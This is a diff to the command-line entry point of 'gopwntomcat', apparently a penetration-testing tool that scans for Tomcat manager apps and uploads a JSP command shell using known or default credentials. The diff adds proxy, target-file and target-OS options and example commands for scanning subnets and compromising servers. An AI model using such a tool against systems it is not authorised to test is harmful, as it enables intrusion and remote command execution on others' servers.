@@ -10,7 +10,7 @@ import (
 	"github.com/patrickhener/gopwntomcat/utils"
 )
 
-const version = "v0.0.1"
+const version = "v0.0.2"
 
 var (
 	mode      string
@@ -21,6 +21,9 @@ var (
 	user      string
 	pass      string
 	customJSP string
+	proxy     string
+	file      string
+	oper      string
 )
 
 func main() {
@@ -35,6 +38,9 @@ func main() {
 	flag.StringVar(&user, "user", "", "pwn: user to authenticate with")
 	flag.StringVar(&pass, "pass", "", "pwn: password to authenticate with")
 	flag.StringVar(&customJSP, "customjsp", "", "Provide a custom jsp shell to be uploaded (default 'use embedded one')")
+	flag.StringVar(&proxy, "proxy", "", "Provide a proxy for http requests - you could chain with burp to make it use socks proxy")
+	flag.StringVar(&file, "file", "", "Provide a Input file to read targets from")
+	flag.StringVar(&oper, "os", "unix", "Provide target operating system")
 
 	flag.Usage = func() {
 		fmt.Printf("gopwntomcat %s\n", version)
@@ -45,6 +51,10 @@ func main() {
 		fmt.Println("\t-targeturi\tWhere the manager app is located at\t(default: /manager/html)")
 		fmt.Println("\t-threads\tConcurrent threads while scanning\t(default: 1)")
 		fmt.Println("\t-rhost\t\tIP or CIDR - you can define multiple")
+		fmt.Println("\tOR!")
+		fmt.Println("\t-file\t\tFile with targets one per line\t\t(line example: http://ip:port)")
+		fmt.Println("")
+		fmt.Println("\t-proxy\t\tProxy for http requests\t\t\t(ex: http://127.0.0.1:8080)")
 		fmt.Println("")
 		fmt.Println("Pwn options:")
 		fmt.Println("\t-port\t\tThe port to use for connection\t\t(default: 8080)")
@@ -54,12 +64,15 @@ func main() {
 		fmt.Println("\t-pass\t\tValid password for logon\t\t(default: tomcat)")
 		fmt.Println("\t-customjsp\tDefine custom jsp to upload\t\t(default: embedded cmd jsp)")
 		fmt.Println("\t-rhost\t\tSingle IP, no multiple -rhost flags allowed")
+		fmt.Println("\t-os\t\tTarget OS (unix/linux/windows)\t\t(default: unix)")
 		fmt.Println("")
 		fmt.Println("Examples:")
 		fmt.Println("\tScan a /24 net with 5 threads and different manager url:")
 		fmt.Println("\t\tgopwntomcat -targeturi /custom/path/to/manager/html -rhost 192.168.1.0/24")
 		fmt.Println("\tScan multiple ips on different port with ssl:")
 		fmt.Println("\t\tgopwntomcat -port 8443 -ssl -rhost 192.168.1.12 -rhost 10.10.10.100")
+		fmt.Println("\tScan multiple ips on different port from file:")
+		fmt.Println("\t\tgopwntomcat -file targets.txt")
 		fmt.Println("\tPwn a tomcat server you know the credentials of:")
 		fmt.Println("\t\tgopwntomcat -mode pwn -rhost 192.168.1.12 -user tomcat -pass s3cret")
 		fmt.Println("\tPwn a tomcat server you know the credentials of with custom jsp:")
@@ -68,17 +81,17 @@ func main() {
 
 	flag.Parse()
 
-	if len(rhostsFlag) == 0 {
-		fmt.Println("You need to provide at least one '-rhost'")
+	if len(rhostsFlag) == 0 && file == "" {
+		fmt.Println("You need to provide at least one '-rhost' or an input file '-file'")
 		fmt.Println("see -h for help")
 		os.Exit(1)
 	}
 
 	switch mode {
 	case "scan":
-		scan.Start(rhostsFlag, port, threads, ssl, targetURI)
+		scan.Start(rhostsFlag, port, threads, ssl, targetURI, proxy, file)
 	case "pwn":
-		pwn.Start(rhostsFlag, port, ssl, targetURI, user, pass, customJSP)
+		pwn.Start(rhostsFlag, port, ssl, targetURI, user, pass, customJSP, proxy, oper)
 	default:
 		fmt.Println("You need to either choose '-mode scan' or '-mode pwn'")
 	}
